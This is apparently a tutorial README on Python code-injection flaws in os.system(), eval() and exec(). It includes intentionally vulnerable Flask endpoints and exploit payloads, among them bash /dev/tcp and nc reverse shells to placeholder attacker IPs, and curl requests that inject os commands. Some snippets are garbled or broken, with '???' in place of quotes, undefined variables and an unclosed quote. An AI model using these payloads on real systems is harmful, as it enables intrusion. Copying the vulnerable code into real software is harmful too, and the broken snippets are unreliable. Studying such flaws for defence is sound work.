# Python-Security-Principles
Fundamental concepts and principles on how Python application can be abused to gain remote code execution or be used to perform any type of unattended functionality

Python is an interpreted high-level general-purpose programming language. Python's design philosophy emphasizes code readability with its notable use of significant indentation. A lot of modern web application use python , especially when utilizing API endpoints. It is critical to secure these web application and API endpoints to ensure that the web application behaves as expected

When validating secure code , always examine the code to determine what paramter is used to accept user input , on what route is it mapped to and how the user supplied data gets processed during the web applications execution flow. Never pass input that the user has control over to a paramater that gets wrapped around a dangerous function() that could interact with the underlying OS and execute code. 

The following Python fucntions() can be abused to execute code, exfiltrate data, perform unattended functionality or bypass authentication pages

- os.system()
- eval()
- exec()
- input()
- str.format()
- Pickle()
- Jinja2/Tornado 
- PyYaml 

| Function | Description | Misconfiguration |
| :---: | :---: | :---: |
| os.system() | Python function() that allows the execution of shell commands | If a Web API route accepts user-controlled data that doesn't get escaped and filtered and passes it to os.system(), it will attempt to execute the input received as a shell command, allowing the Web API route paramater to be abused for unintended code execution |

Below is a basic example of how this function() can be used. The function() itself is not evil, but passing unsanitized user input to the function() could be dangerous and lead to code execution. Always ensure to pass data to os.system() that is validated, escaped and required for it's intended functionality.

Basic Script - Accepts user input and saves it in the txt variable and then passes the txt variable to os.system()
```
#!/usr/bin/python

import os

txt = input("Enter Command to Execute?: ")
os.system(txt)
```
Another example of a similiar program that is not properly validated. The below code asks for a name , but passes the input to os.system(). This is a basic example of how the context of the program does not match it's functionality. 
```
#!/usr/bin/python

import os

txt = input("What is your name?: ")
os.system(txt)
```
Explioting the above code. Since the entire input variable is send to os.system(), the attacker can just provide a reverse shell one-liner instead of a valid name
```
What is your name?: bash -i >& /dev/tcp/10.10.10.10/9999 0>&1

//Replace IP
//Replace Port
```
The following code accepts user input from the public and passes it to os.system(), allowing the web application to be vulnerable to code execution

Interacting with the web app
```
curl -X POST http://10.10.10.10:5000/api?request=
curl -X POST -d "request=test" http://10.10.10.10:5000/api
```
Vulnerable Web Application
```
#!/usr/bin/python

import os
from flask import Flask, request

app = Flask(__name__)


@app.route("/api", methods=["POST"])
def hackme():
    data = os.system(request.form['request'])
    print(data)
```
Explioting the web app

Payload: nc -e /bin/bash 10.10.5.10 9999 | Can be replaced by any other form of RCE. Ensure to base64 or URL encode the payload

```
curl -x POST -d "request=nc -e /bin/bash 10.10.5.10 9999" http://10.10.10.10:5000/api
```
Web app breakdown:

| Function | Description | 
| :---: | :---: | 
| #!/usr/bin/python | Forcing the web app to use my built in python path |
| import os | Importing the os library to use it's functionality such as calling os.system() |
| Flask | Micro Web Framework Written to run the web application  |
| @app.route | Specifies the internal web app route to the location on the web server where it receives input  |
| /api | The actual route on the web server (Web API Route) |
| POST | Enforces that the route accept only HTTP POST requests |
| data | Variable that stores input the web app receives |
| os.system() | Function that allows the execution of shell commands |
| request | Parameter in the /api route that accepts input via HTTP POST requests |
| print(data) | Print the input received via the web API route , wrapped around os.system() that allows code execution |

| Function | Description | Misconfiguration |
| :---: | :---: | :---: |
| eval() | Function in Python that takes strings and execute them as arithmetic functions such as integer values | If a Web paramater accepts user-controlled data that doesn't get escaped and filtered and passes it to eval(), it will attempt to execute the input received as an arithmetic function that could lead to the creation of subprocess for code execution |

The following code acts as a simple calculator that uses eval() to do arithmetic function
```
compute = input('\nYour expression? => ')
if not compute:
print ("No input")
else:
print ("Result =", eval(comp))
```
Giving the program the below output , it will do a calculation to calculate the result using the eval() function
```
Input: 2*3
Program output: 6
```
Exploiting the code by giving the program untrusted input
```
Input: __import__(???os???).system(???whoami???) 
Output: root
```
If the os.system() is blacklisted, the below method can also be used to execute code
```
Input: __import__('os').popen("whoami).read()
Output: root
```
Secure Code 

The follwoing code includes the validate() fucntion to ensure that only numbers and arithmetic expressions are allowed
```
compute = input('\nYour expression? => ')
if not compute :
print ("No input")
else:
if validate(compute):
print ("Result =", eval(comp))
else:
print ("Error")
```
| Function | Description | Misconfiguration |
| :---: | :---: | :---: |
| exec() | Method executes the Python code block passed as a string or a code object | If a Web paramater accepts user-controlled data that doesn't get escaped and filtered and passes it to exec(), the attacker could supply python logic as part of the user input to abuse the exec() function if it does not get validated |

The following code takes input and passes it to exec()
```
code = input('What command(s) in python did you learn today?')
exec(code)
```
Exploiting the code , we can pass valid python logic to exec(). This can also be validated by using the validate() function
```
Input: __import__('os').system.listdir() 
```
Vulnerable Web app passes user-input to exec()
```
from flask import Flask, request

app = Flask(__name__)


@app.route("/api", methods=["POST"])
def hackme():
    data = exec(request.form['request'])
    input = data
    print(input)
```
Exploiting the web app. Paramater can also be URLEncoded or Base64 encoded to remove bad chars
```
curl -X POST -d "request=print('Hello There')" http://127.0.0.1:5000/api
curl -X POST -d "request=__import__(???os???).system(???whoami???)" http://127.0.0.1:5000/api
curl -X POST -d "request=__import__('os').popen('whoami').read()" http://127.0.0.1:5000/api
curl -X POST -d "request=__import__('os').popen('nc -e /bin/bash <attacker_ip> <attacker_port>').read()" http://127.0.0.1:5000/api
```

